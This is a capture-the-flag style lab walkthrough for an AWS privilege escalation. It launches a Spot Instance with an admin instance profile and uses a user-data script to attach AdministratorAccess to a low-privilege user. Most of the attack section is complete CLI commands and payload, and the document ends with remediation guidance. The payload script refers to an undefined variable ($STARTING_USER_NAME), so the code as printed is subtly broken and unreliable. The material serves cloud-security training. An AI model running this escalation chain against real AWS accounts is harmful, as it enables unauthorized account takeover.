# Guided Walkthrough: One-Hop Privilege Escalation via iam:PassRole + ec2:RequestSpotInstances

This scenario demonstrates a privilege escalation vulnerability where an IAM user holds two permissions that seem unremarkable in isolation: `iam:PassRole` and `ec2:RequestSpotInstances`. Together they form a reliable one-hop path to full administrative access. The attacker launches a Spot Instance with an admin IAM role attached and embeds a user-data script that runs at boot time under the admin role's credentials -- calling `iam:AttachUserPolicy` to grant `AdministratorAccess` directly to the starting user.

The technique is subtle because `ec2:RequestSpotInstances` is frequently overlooked as an escalation vector. Security teams often apply controls to `ec2:RunInstances` but forget that Spot Instance requests accept identical launch specifications, including instance profiles and user-data. From an IAM policy standpoint, the two APIs are functionally equivalent for this attack.

This attack pattern also avoids the need to log into or directly interact with the EC2 instance. The entire escalation happens server-side: the user-data script runs automatically at boot, performs a single IAM API call with the instance's admin credentials, and then the instance can be discarded. There is no SSH, no SSM session, no interaction with the running instance required once the Spot request is submitted.

## The Challenge

You have obtained credentials for `pl-prod-ec2-004-to-admin-starting-user` -- a low-privilege IAM user with two specific permissions: `iam:PassRole` (scoped to the target admin role) and `ec2:RequestSpotInstances`. Your goal is to escalate to effective administrator access in this AWS account.

Start by confirming your identity and verifying that you genuinely don't have admin access yet:

```bash
export AWS_ACCESS_KEY_ID=<starting_user_access_key_id>
export AWS_SECRET_ACCESS_KEY=<starting_user_secret_access_key>
unset AWS_SESSION_TOKEN

aws sts get-caller-identity
```

You should see yourself operating as `pl-prod-ec2-004-to-admin-starting-user`. Confirm that admin-level calls are blocked:

```bash
aws iam list-users --max-items 1
# AccessDenied
```

Good -- no admin access yet. Now let's find the path.

## Reconnaissance

Your starting user has `iam:ListRoles` and `iam:ListInstanceProfiles` as helpful permissions. Use them to understand the landscape.

First, look for roles in this account that could be passed to an EC2 instance:

```bash
aws iam list-roles \
  --query 'Roles[?contains(RoleName, `ec2-004`)].{Name:RoleName,Arn:Arn}' \
  --output table
```

You'll find `pl-prod-ec2-004-to-admin-target-role`. Now check if there is an instance profile wrapping it -- instance profiles are the bridge between IAM roles and EC2 instances:

```bash
aws iam list-instance-profiles \
  --query 'InstanceProfiles[?contains(InstanceProfileName, `ec2-004`)].{Name:InstanceProfileName,Arn:Arn}' \
  --output table
```

There it is: `pl-prod-ec2-004-to-admin-instance-profile`. This instance profile wraps the admin role and is what you'll reference when launching the Spot Instance.

Before you can launch the instance, you need two more pieces of infrastructure information: an AMI ID and a subnet. Pull the latest Amazon Linux 2023 AMI and a subnet from the default VPC:

```bash
# Find the most recent Amazon Linux 2023 AMI
aws ec2 describe-images \
  --owners amazon \
  --filters "Name=name,Values=al2023-ami-2023.*-x86_64" "Name=state,Values=available" \
  --query 'Images | sort_by(@, &CreationDate) | [-1].ImageId' \
  --output text

# Get the default VPC
aws ec2 describe-vpcs \
  --filters "Name=is-default,Values=true" \
  --query 'Vpcs[0].VpcId' \
  --output text

# Get a subnet in that VPC
aws ec2 describe-subnets \
  --filters "Name=vpc-id,Values=<default-vpc-id>" \
  --query 'Subnets[0].SubnetId' \
  --output text
```

Note down the AMI ID and subnet ID -- you will need them when constructing the Spot Instance launch specification.

## Exploitation

Now you have everything you need. The attack has two logical steps: craft a malicious user-data script, then submit the Spot Instance request with the admin instance profile attached.

The user-data script is the payload. It runs automatically when the instance boots, under the credentials of the instance profile role -- the admin role. One AWS CLI call is all it needs:

```bash
STARTING_USER="pl-prod-ec2-004-to-admin-starting-user"

USER_DATA=$(cat <<EOF
#!/bin/bash
exec > >(tee /var/log/user-data.log|logger -t user-data -s 2>/dev/console) 2>&1
echo "Starting privilege escalation script..."

# Wait for IAM role to be available via IMDS
sleep 15

# Attach AdministratorAccess policy to the starting user
aws iam attach-user-policy \
  --user-name \$STARTING_USER_NAME \
  --policy-arn arn:aws:iam::aws:policy/AdministratorAccess

echo "AdministratorAccess attached successfully"
EOF
)

USER_DATA_B64=$(echo "$USER_DATA" | base64 | tr -d '\n')
```

The 15-second sleep gives the instance time to fully initialize and the instance profile credentials to become available via IMDS. Now construct the launch specification and submit the Spot request:

```bash
INSTANCE_PROFILE="pl-prod-ec2-004-to-admin-instance-profile"

LAUNCH_SPEC=$(cat <<EOF
{
  "ImageId": "<ami-id>",
  "InstanceType": "t3.micro",
  "IamInstanceProfile": {
    "Name": "$INSTANCE_PROFILE"
  },
  "UserData": "$USER_DATA_B64",
  "NetworkInterfaces": [
    {
      "DeviceIndex": 0,
      "SubnetId": "<subnet-id>",
      "AssociatePublicIpAddress": true
    }
  ]
}
EOF
)

aws ec2 request-spot-instances \
  --spot-price "0.05" \
  --instance-count 1 \
  --type one-time \
  --launch-specification "$LAUNCH_SPEC" \
  --output json
```

Note the `SpotInstanceRequestId` from the output. The Spot fleet now has your request and will fulfill it within seconds to a minute or two. Poll for fulfillment:

```bash
aws ec2 describe-spot-instance-requests \
  --spot-instance-request-ids <spot-request-id> \
  --query 'SpotInstanceRequests[0].[State,Status.Code,InstanceId]' \
  --output text
```

Once the state is `active` and the code is `fulfilled`, you have an instance ID. The instance is now booting. Wait another 2-3 minutes for the user-data script to execute, then check IAM:

```bash
aws iam list-attached-user-policies \
  --user-name pl-prod-ec2-004-to-admin-starting-user \
  --query 'AttachedPolicies[?PolicyName==`AdministratorAccess`].PolicyName' \
  --output text
```

Keep polling until `AdministratorAccess` appears in the output.

## Verification

Confirm that your original starting user credentials now have admin access -- no role assumption, no session token exchange:

```bash
aws iam list-users --max-items 3 --output table
```

It works. You did not need to assume a role, grab temporary credentials, or interact with the running instance. Your original IAM user now has `AdministratorAccess` attached directly, and it persists until explicitly removed.

## Capture the Flag

Admin access isn't the finish line — the flag is. Every Pathfinding Labs scenario stores a flag in a well-known location, and retrieving it is how you prove the end-to-end attack worked. For `to-admin` scenarios like this one, the flag lives in AWS Systems Manager Parameter Store at a predictable path under `/pathfinding-labs/flags/`. Reading it requires `ssm:GetParameter` on that specific parameter, which the `AdministratorAccess` managed policy now attached to your starting user provides implicitly.

Using your starting user credentials (which, thanks to the previous step, now hold `AdministratorAccess`), read the flag:

```bash
aws ssm get-parameter \
    --name /pathfinding-labs/flags/ec2-004-to-admin \
    --query 'Parameter.Value' \
    --output text
# flag{...}  — your scenario-specific flag value
```

The value printed is the flag you submit to complete the challenge. Its exact contents are deployment-specific (the default ships in `flags.default.yaml` in the repo root; vendors running hosted labs can swap in their own set via `plabs init --flag-file` or `plabs flags import`). The retrieval mechanism and path are identical across every `to-admin` scenario, so this same command works as the final step for any of them — only the scenario ID in the path changes.

## What Happened

You started with two narrow-looking permissions -- `iam:PassRole` and `ec2:RequestSpotInstances` -- and turned them into full account compromise without ever touching a running instance interactively. The Spot Instance was the weapon: it ran code server-side with administrative credentials, modified IAM on your behalf, and could be discarded immediately afterward.

The root cause is the trusted relationship between EC2 compute and IAM: when you attach an IAM role to an EC2 instance, any code running on that instance inherits the role's permissions. User-data scripts execute at boot with full instance profile access. An attacker who can choose which role gets attached (via `iam:PassRole`) and can launch compute (via `ec2:RequestSpotInstances` or `ec2:RunInstances`) can chain these two capabilities into a privilege escalation path that bypasses all of the normal IAM boundaries protecting the admin role.

In real environments, this pattern appears whenever developers are granted Spot Instance launch permissions for cost-saving workloads, combined with a `PassRole` that targets a role broader than strictly necessary. The fix is straightforward: restrict `iam:PassRole` to only the roles a principal actually needs to pass, scope Spot and RunInstances permissions with conditions that prevent them from being used with privileged instance profiles, and enforce IAM permission boundaries so that even if an instance runs admin-level code, it cannot modify the calling user's own policies.
